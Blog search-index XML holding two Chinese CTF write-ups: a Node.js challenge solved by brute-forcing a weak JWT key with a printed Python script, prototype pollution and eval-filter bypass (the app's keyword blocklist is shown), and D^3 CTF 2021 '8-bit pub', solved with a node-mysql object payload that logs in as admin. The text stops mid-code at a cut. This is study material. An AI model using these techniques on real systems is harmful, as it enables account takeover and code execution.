<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>一道nodejs污染+jwt爆破的题</title>
    <link href="/2023/07/01/%E4%B8%80%E9%81%93nodejs%E6%B1%A1%E6%9F%93+jwt%E7%88%86%E7%A0%B4%E7%9A%84%E9%A2%98/Nodejs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/07/01/%E4%B8%80%E9%81%93nodejs%E6%B1%A1%E6%9F%93+jwt%E7%88%86%E7%A0%B4%E7%9A%84%E9%A2%98/Nodejs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="Nodejs命令执行"><a href="#Nodejs命令执行" class="headerlink" title="Nodejs命令执行"></a>Nodejs命令执行</h2><p>又是复现其他师傅博客上的题目的一天~</p><p>这题的整体结构还是比较简单的，但是做的过程还是踩了不少的坑。</p><p><img src="/../../img/nodejs_image/1.png"></p><p>看起来需要获得admin权限</p><p>抓个包看一下</p><p><img src="/../../img/nodejs_image/2.png"></p><p>coockie部分看起来有点像JWT，理由是由三部分加密组成，且由点进行连接。</p><p>到jwt.io进行解密</p><p><img src="/../../img/nodejs_image/3.png"></p><p>尝试将guest改成admin再传入，然而还是不行。</p><p>可以推测这里是使用了密钥进行加密，这里对jwt弱密钥进行爆破，编写如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#jwtj加密key值爆破脚本</span><br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-comment">#在这里输入jwt token</span><br>jwt_str=<span class="hljs-string">&#x27;&#x27;</span><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;keys.txt&#x27;</span>)<span class="hljs-comment">#在这里指定字典文件</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>    <span class="hljs-keyword">try</span>:<br>        jwt.decode(jwt_str, verify=<span class="hljs-literal">True</span>, key=i, algorithms=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the key is &#x27;</span>+i)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> (jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAudienceError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;there are something wrong,but the key is&#x27;</span> + i)<span class="hljs-comment">#数据部分预定义字段错误,但是key是正确的</span><br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> jwt.exceptions.InvalidSignatureError:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;found no key&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../img/nodejs_image/4.png"></p><p>重新进行编码成功进入<code>/source</code>页面，里面是如下源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs Javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;jsonwebtoken&quot;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>);<br><span class="hljs-keyword">const</span> jwt_secret = <span class="hljs-string">&quot;toor&quot;</span>;<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;cookie-parser&quot;</span>);<br><span class="hljs-keyword">const</span> putil_merge = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;putil-merge&quot;</span>);<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;)).<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Super</span> = &#123;&#125;;<br><br><span class="hljs-keyword">var</span> safecode = <span class="hljs-keyword">function</span> (<span class="hljs-params">code</span>) &#123;<br>  <span class="hljs-keyword">let</span> validInput =<br>    <span class="hljs-regexp">/global|mainModule|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\+|\*/gi</span>;<br>  <span class="hljs-keyword">return</span> !validInput.<span class="hljs-title function_">test</span>(code);<br>&#125;;<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/code&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;html&quot;</span>);<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;POST&quot;</span> &amp;&amp; req.<span class="hljs-property">body</span>) &#123;<br>    <span class="hljs-title function_">putil_merge</span>(&#123;&#125;, req.<span class="hljs-property">body</span>, &#123; <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span> &#125;);<br>  &#125;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;welcome to code&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/source&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;html&quot;</span>);<br>  <span class="hljs-keyword">var</span> auth = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">auth</span>;<br>  jwt.<span class="hljs-title function_">verify</span>(auth, jwt_secret, <span class="hljs-keyword">function</span> (<span class="hljs-params">err, decoded</span>) &#123;<br>    <span class="hljs-keyword">if</span> (decoded.<span class="hljs-property">user</span> === <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>      res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname + <span class="hljs-string">&quot;/app.js&quot;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;you are not admin&quot;</span>);<br>    &#125;<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/root&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;html&quot;</span>);<br>  code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">key</span>);<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">body</span>.<span class="hljs-property">key</span> || req.<span class="hljs-property">body</span>.<span class="hljs-property">key</span> === <span class="hljs-literal">undefined</span> || req.<span class="hljs-property">body</span>.<span class="hljs-property">key</span> === <span class="hljs-literal">null</span>) &#123;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;please input key&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Super</span>[<span class="hljs-string">&quot;userid&quot;</span>] === <span class="hljs-string">&quot;Superadmin&quot;</span> + req.<span class="hljs-property">body</span>.<span class="hljs-property">key</span>) &#123;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">safecode</span>(code)) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;forbidden!&quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-built_in">eval</span>(code));<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;You are not the Super&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;html&quot;</span>);<br>  <span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&quot;guest&quot;</span> &#125;, jwt_secret, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&quot;HS256&quot;</span> &#125;);<br>  res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&quot;auth &quot;</span>, token);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;Only admin can get source in /source&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Server started on port 3000&quot;</span>));<br><br></code></pre></td></tr></table></figure><p>在<code>/root</code>路由下有一个eval函数可以执行命令，然而要进入eval函数的判断前提是<code>Super[&quot;userid&quot;] === &quot;Superadmin&quot;+req.body.key</code>和<code>key</code>值不为空</p><p>在往上在<code>code</code>路由下有一个<code>putil_merge</code>函数进行merge操作，可以推断这里要使用原型链污染。</p><p>这里现在<code>code</code>处污染<code>userid</code>的值，然后再在root下传入<code>key</code>和<code>code</code>的值便可以进行命令执行了。</p><p>原先我不知道<code>req.body.key</code> 这个参数可以用POST或者json直接传参赋值，还在想要如何污染才能绕过判断，所以在这里卡了一会。。。</p><p>其实在程序最上面那一部分就说明了可以使用json或者POST传参</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Javascript">app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;)).<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br></code></pre></td></tr></table></figure><p>卡住我的第二个点是我不知道<code>Super[&quot;userid&quot;]</code>其实就相当于<code>Super.userid</code>所以只要污染原型链上的<code>userid</code>就够了，在头几行也定义了说<code>Super</code>是一个空对象。这搞得我也想了一段时间要怎么去污染<code>Super[&quot;userid&quot;]</code>这个参数。。。</p><p>还有就是<code>Super[&quot;userid&quot;] === &quot;Superadmin&quot; + req.body.key</code>中的<code>&quot;Superadmin&quot; + req.body.key</code>其实就是简单的字符串拼接，当时也不知道自己是脑袋抽了还是怎么了，想不过来这个要怎么处理。。。</p><p>该清楚上面那些原理后，接着可以构造发包了。</p><p>首先是code路由下的构造</p><p><img src="/../../img/nodejs_image/5.png"></p><p>这里需要注意的是需要在请求头中加入<code>Content-type:application/json</code>,我一开始没有注意，把它加到<code>Accept</code>头里去了，整了半天才发下加错地方了。。。。</p><p>接着是root路由下的构造</p><p><img src="/../../img/nodejs_image/6.png"></p><p><code>key</code>值传入<code>zzz</code>与<code>Superadmin</code>拼接通过判断，同时<code>code</code>进行命令执行。</p><p>这里使用的是POST直接传参，所以要写成<code>Content-type:application/x-www-form-urlencoded</code></p><p>在源码处我们有注意到<code>code</code>其实是进行了正则匹配过滤，可以使用一些常见bypass进行绕过</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">16</span>进制编码<br><span class="hljs-built_in">unicode</span>编码<br>加号拼接<br>模板字符串<br><span class="hljs-built_in">concat</span>函数连接<br>base64编码<br></code></pre></td></tr></table></figure><p>在这里我是用的是16进制编码。另外我发现只有进行同步进程创建才可以成功执行命令。</p><p>最后在记录一个大坑，今天这个洞其实是个CVE，影响版本从1.0.0 到 3.6.6。而我一开始安装的putil-merge是3.10.10的版本，已经修复了该反序列化漏洞，卡了我一下午。。。。后面才发现是因为版本原因，下次也要多注意一点了。。</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.anquanke.com/post/id/237032#h2-0">nodejs中代码执行绕过的一些技巧-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="http://47.103.121.189/2022/08/19/node-js%E4%B8%80%E9%81%93%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%B8%A9%E5%9D%91%E8%AE%B0/">哈哈，骗你的！ヾ(ﾟ∀ﾟゞ)</a></p><p><a href="https://www.jianshu.com/p/acbb936e87df">https://www.jianshu.com/p/acbb936e87df</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>D^3 CTF 2021 8-bit pub复现</title>
    <link href="/2023/06/28/D%5E3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/D%5E3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/06/28/D%5E3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/D%5E3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="D-3-CTF-2021-8-bit-pub复现"><a href="#D-3-CTF-2021-8-bit-pub复现" class="headerlink" title="D^3 CTF 2021 8-bit pub复现"></a>D^3 CTF 2021 8-bit pub复现</h3><p>这题是顺着群里师傅的链接摸到的，前前后后总共拖了三天才完成。。。。拖延症太难受了</p><p>github题目仓库：<a href="https://github.com/crumbledwall/CTFChallenges/tree/main/D3CTF2021/8-bit_pub">CTFChallenges&#x2F;D3CTF2021&#x2F;8-bit_pub at main · crumbledwall&#x2F;CTFChallenges (github.com)</a></p><p>根据师傅所说比赛的时候是给了源码的，所以我们先从源码入手，github上直接拖下来的题目文件是给docker用的，这里要先输入<code>npm install</code>补全一些依赖库，到时候审计的时候用得上。</p><p><img src="/../../img/8-bit%20pub-images/1.png"></p><p>首先尝试注册登录，然而并没有什么卵用，题目需要你拿到admin的账号</p><p>在<code>route/index.js</code>处可以看到各个功能的路由，查看注册和登录的源码文件。</p><p>可以看到如下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> sql.<span class="hljs-title function_">query</span>(<br>      <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>,<br>      [username, password],<br>      <span class="hljs-keyword">function</span> (<span class="hljs-params">err, res</span>) &#123;<br>        <span class="hljs-keyword">if</span> (err) &#123;<br>          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;error: &quot;</span>, err);<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">done</span>(err, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">done</span>(<span class="hljs-literal">null</span>, res);<br>        &#125;<br>      &#125;<br>    );<br>  &#125;,<br>&#125;;<br><br> <span class="hljs-attr">signup</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">username, password, done</span>) &#123;<br>    sql.<span class="hljs-title function_">query</span>(<br>      <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>,<br>      [username],<br>      <span class="hljs-keyword">function</span> (<span class="hljs-params">err, res</span>) &#123;<br>.......<br></code></pre></td></tr></table></figure><p>这里的sql语句使用了占位符，会对传进来的参数进行转义，所以没办法进行sql注入。</p><p>但是在node-mysql文档的末尾有这么一段话</p><blockquote><p><strong>注意：</strong>与预处理语句不同的是，<code>?</code>就算出现在注释或字符串里，也会被替换成对应的值。</p><p>不同类型的值会按不同的规则进行转义，规则如下：</p><ul><li>数字保持不变</li><li>布尔值会被转换为<code>true</code>&#x2F;<code>false</code></li><li>日期对象转换为<code>&#39;YYYY-mm-dd HH:ii:ss&#39;</code>字符串</li><li>Buffer对象会被转换为十六进制字符串，例如<code>X&#39;0fa5&#39;</code></li><li>字符串会被安全转义</li><li>数组会被转换为列表，例如<code>[&#39;a&#39;, &#39;b&#39;]</code>会被转换为<code>&#39;a&#39;, &#39;b&#39;</code></li><li>嵌套数组会被转换为分组列表(用于批量插入)，例如<code>[[&#39;a&#39;, &#39;b&#39;], [&#39;c&#39;, &#39;d&#39;]]</code>会被转换为<code>(&#39;a&#39;, &#39;b&#39;), (&#39;c&#39;, &#39;d&#39;)</code></li><li>具有<code>toSqlString</code>方法的对象会调用<code>.toSqlString()</code>，并将返回的值作为初始SQL。</li><li>对象上的可枚举属性会被转换为<code>key = &#39;val&#39;</code>键值对。如果属性值是一个函数，该属性会被忽略。如果属性值是对象，会对其调用toString()并将返回的值作为val。</li><li><code>undefined</code>&#x2F;<code>null</code>会转换为<code>NULL</code></li><li><code>NaN</code>&#x2F;<code>Infinity</code>保持不变。 MySQL目前并不支持。如果你强行插入这类值，将触发MySQL错误。</li></ul></blockquote><p>这里是利用了传入对象会被转换为`key`&#x3D;val的键值对的这个特性</p><p>所以这里的操作是要传入一个对象，使用的是json格式的数据</p><p>在后面嵌套两个password的原因是就是传入一个对象。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这样后台的查询语句是这样的,相当于构造了一个万能密码，SQL语句中逻辑运算符具有优先级，【&#x3D;】优先于【and】,【and】优先于【or】</p><p>sql查询语句如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span> = <span class="hljs-string">&#x27;admin&#x27;</span> AND password = `password` = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>在这里我本来有个疑惑，就是在传入对象的时候为什么不能再<code>username</code>那里也传入一组对象比如</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot;username&quot;</span><span class="hljs-symbol">:admin</span>&#125;<span class="hljs-punctuation">,</span><span class="hljs-string">&quot;password&quot;</span>:&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:true</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>但是经过尝试发现这样穿的话是不行的。后来问了其他师傅，在注册时传入上述的数据，然后进入数据库里面看了一下，发现如果传入的是对象的话解析之后传到数据库的内容都是NULL或者0，这样的话这句万能密码的sql语句就不能成立。</p><p><img src="/../../img/8-bit%20pub-images/2.png"></p><p>成功登陆之后我们可以直接跳转到admin页面</p><p><img src="/../../img/8-bit%20pub-images/3.png"></p><p>最早看到sql注入占位符的时候我以为是预编译，没办法注入（当然占位符也不能注入:（  ），所以我放弃了sql注入的想法，所以在这一步我原先的想法是去伪造session绕过身份验证去，因为我在通往admin的路由上看到还调用了auth.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> auth = <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-number">302</span>, <span class="hljs-string">&quot;/&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> === <span class="hljs-string">&quot;GET&quot;</span>) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">sendView</span>(<span class="hljs-string">&quot;forbidden.html&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;Forbidden.&quot;</span> &#125;);<br>    &#125;<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = auth;<br></code></pre></td></tr></table></figure><p>这边验证的是<code>session.username</code>而<code>session.username</code>是从这里获得的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">signin</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  user.<span class="hljs-title function_">signin</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>, req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">err, result</span>) &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: err.<span class="hljs-property">message</span> &#125;);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (result.<span class="hljs-property">length</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">session</span>)<br>      req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = result[<span class="hljs-number">0</span>].<span class="hljs-property">username</span>;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;Signin success.&quot;</span> &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;Username or password wrong.&quot;</span> &#125;);<br>    &#125;<br>  &#125;);<br>&#125;,<br></code></pre></td></tr></table></figure><p>这里调用的user.signig()函数如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">signin</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">username, password, done</span>) &#123;<br>    sql.<span class="hljs-title function_">query</span>(<br>      <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>,<br>      [username, password],<br>      <span class="hljs-keyword">function</span> (<span class="hljs-params">err, res</span>) &#123;<br>        <span class="hljs-keyword">if</span> (err) &#123;<br>          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;error: &quot;</span>, err);<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">done</span>(err, <span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-title function_">done</span>(<span class="hljs-literal">null</span>, res);<br>        &#125;<br>      &#125;<br>    );<br>  &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>所以可以得到<code>result[0].username</code>的值即为<code>session.username</code></p><p>因为这题的环境是用docker搭的，没办法直接用vscode调试，所以这里的<code>result</code>的值没办法知道是什么，但猜测是数据库查询返回的结果，其中username是列名，所以我们应该是没办法伪造session的。。:(</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>登陆成功后跳转到admin页面，看样子像一个发送邮件的页面。开始代码审计！</p><p>首先根据路由来到<code>adminController.js</code>的<code>email</code>方法，乍一看好像没有什么利用点。。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">  <span class="hljs-attr">email</span>: <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> contents = &#123;&#125;;<br><br>    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(req.<span class="hljs-property">body</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> &#123;<br>      shvl.<span class="hljs-title function_">set</span>(contents, key, req.<span class="hljs-property">body</span>[key]);<br>    &#125;);<br><br>    contents.<span class="hljs-property">from</span> = <span class="hljs-string">&#x27;&quot;admin&quot; 2449970596@qq.com&#x27;</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">await</span> <span class="hljs-title function_">send</span>(contents);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;Success.&quot;</span>&#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title 